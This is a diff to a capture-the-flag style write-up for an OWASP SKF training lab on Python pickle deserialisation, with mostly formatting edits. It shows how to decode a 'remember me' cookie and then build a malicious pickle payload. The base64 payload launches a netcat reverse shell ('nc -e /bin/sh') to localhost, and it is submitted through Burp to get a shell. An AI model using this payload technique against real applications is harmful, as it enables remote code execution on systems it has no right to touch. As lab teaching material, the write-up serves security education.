@@ -1,12 +1,12 @@
-# KBID xxx - Deserialization - Pickle-2
+# KBID 271 - Deserialisation Pickle-2
 
 ## Running the app
 
-```text
+```
 $ sudo docker pull blabla1337/owasp-skf-lab:des-pickle-2
 ```
 
-```text
+```
 $ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-pickle-2
 ```
 
@@ -16,9 +16,7 @@ Now that the app is running let's go hacking!
 
 ## Running the app Python3
 
-First, make sure python3 and pip are installed on your host machine.
-After installation, we go to the folder of the lab we want to practise 
-"i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
+First, make sure python3 and pip are installed on your host machine. After installation, we go to the folder of the lab we want to practise "i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
 
 ```
 $ pip3 install -r requirements.txt
@@ -29,9 +27,8 @@ $ python3 <labname>
 ```
 
 {% hint style="success" %}
- Now that the app is running let's go hacking!
+Now that the app is running let's go hacking!
 {% endhint %}
-
 
 ![Docker image and write-up thanks to Contrahack.io !](.gitbook/assets/screen-shot-2019-03-04-at-21.33.32.png)
 
@@ -39,13 +36,9 @@ $ python3 <labname>
 
 Serialisation is used by application to easely store an object and transfer it across systems and networks. If an application needs to store an instance of a class, it can use serialisation to get a string representation of this object. When the application or an other application needs to use the instance again, it will unserialise the string to get back the object.
 
-Obviously, an attacker can tamper with a string that will be deserialised and potentially trigger unexpected behaviour in the application. Depending on the language and library used, this unexpected behaviour can go from arbitrary object creation to remote code execution. 
+Obviously, an attacker can tamper with a string that will be deserialised and potentially trigger unexpected behaviour in the application. Depending on the language and library used, this unexpected behaviour can go from arbitrary object creation to remote code execution.
 
-Some use cases for python pickle:
-1) saving a program's state data to disk so that it can carry on where it left off when restarted (persistence)
-2) sending python data over a TCP connection in a multi-core or distributed system (marshalling)
-3) storing python objects in a database
-4) converting an arbitrary python object to a string so that it can be used as a dictionary key (e.g. for caching & memorization).
+Some use cases for python pickle: 1) saving a program's state data to disk so that it can carry on where it left off when restarted (persistence) 2) sending python data over a TCP connection in a multi-core or distributed system (marshalling) 3) storing python objects in a database 4) converting an arbitrary python object to a string so that it can be used as a dictionary key (e.g. for caching & memorization).
 
 Lets start the application and register a new user
 
@@ -53,8 +46,7 @@ Lets start the application and register a new user
 
 ![](.gitbook/assets/DES-Register2.png)
 
-Please note that (for convenience) your password will be reset if the user already exists.
-Also note that the username and password are case sensitive.
+Please note that (for convenience) your password will be reset if the user already exists. Also note that the username and password are case sensitive.
 
 Now that we have valid credentials, we can login:
 
@@ -88,9 +80,7 @@ As you might have guessed, the remember me cookie is a serialized object, (proba
 
 If we know or guess the used technology (in this case:pickle serialisation in python), we can try to deserialise the object
 
-From wikipedia:
-The pickle module implements binary protocols for serializing and de-serializing a Python object structure. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy
-
+From wikipedia: The pickle module implements binary protocols for serializing and de-serializing a Python object structure. “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream, and “unpickling” is the inverse operation, whereby a byte stream (from a binary file or bytes-like object) is converted back into an object hierarchy
 
 ```python
 import pickle, base64
@@ -98,8 +88,7 @@ b64 = 'gANjX19tYWluX18KdXNyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYBAAAAFJ1ZHlxBFgIA
 print(pickle.loads(base64.b64decode(b64)).__class__)
 ```
 
-This shows us the object is an instance of the usr class.
-So we can enumerate the properties of the object as follows:
+This shows us the object is an instance of the usr class. So we can enumerate the properties of the object as follows:
 
 ```python
 import pickle, base64
@@ -112,18 +101,18 @@ a = pickle.loads(base64.b64decode(b64))
 print(dir(a))
 ```
 
-The dir() function returns all properties and methods of the specified object, without the values.
-This function will return all the properties and methods, even built-in properties which are default for all object.
+The dir() function returns all properties and methods of the specified object, without the values. This function will return all the properties and methods, even built-in properties which are default for all object.
 
-
-```text
+```
 This will output the following:
 ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'password', 'username']
 ```
+
 The attributes we were looking for are 'password' and 'username'
 
 Putting it all toghther:
-```Python
+
+```python
 import pickle, base64
 class usr(object):
     pass
@@ -137,11 +126,9 @@ print(a.password)
 
 Although the above was nice to understand what serialization comprehends, we still need to exploit the vulnerability ;-)
 
-To exploit the vulnerability we'll create an object that runs a system command to start a reverse shell.
-After instanciating the object, we serialize it and base64 encode it. This output will be our payload. 
+To exploit the vulnerability we'll create an object that runs a system command to start a reverse shell. After instanciating the object, we serialize it and base64 encode it. This output will be our payload.
 
-
-```Python
+```python
 import pickle, base64,os
 
 class skf(object):
@@ -152,10 +139,12 @@ a = skf()
 ser = pickle.dumps(a)
 print (base64.b64encode(ser))
 ```
-*Note: If Netcat (nc) program is not available, change the argument passed at os.system call to sleep(5).*
+
+_Note: If Netcat (nc) program is not available, change the argument passed at os.system call to sleep(5)._
 
 This will yield the following output:
-```Text
+
+```
 gANjcG9zaXgKc3lzdGVtCnEAWCAAAABuYyAtbnYgMTI3LjAuMC4xIDEyMzQgLWUgL2Jpbi9zaHEBhXECUnEDLg==
 ```
 
@@ -163,15 +152,10 @@ Now we prepare a net cat listner on our machine, ready to receive the reverse sh
 
 ![](.gitbook/assets/DES-nc-listner.png)
 
-We can submit our malicious payload in Burp Suite Repeater by replacing the cookie value with the one we generated above:
-![](.gitbook/assets/DES-Sendpayload.png)
+We can submit our malicious payload in Burp Suite Repeater by replacing the cookie value with the one we generated above: ![](.gitbook/assets/DES-Sendpayload.png)
 
-A revers shell is is connected:
-![](.gitbook/assets/DES-Shell.png)
-
-
+A revers shell is is connected: ![](.gitbook/assets/DES-Shell.png)
 
 ## Additional sources
 
-{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" caption="" %}
-
+{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" %}
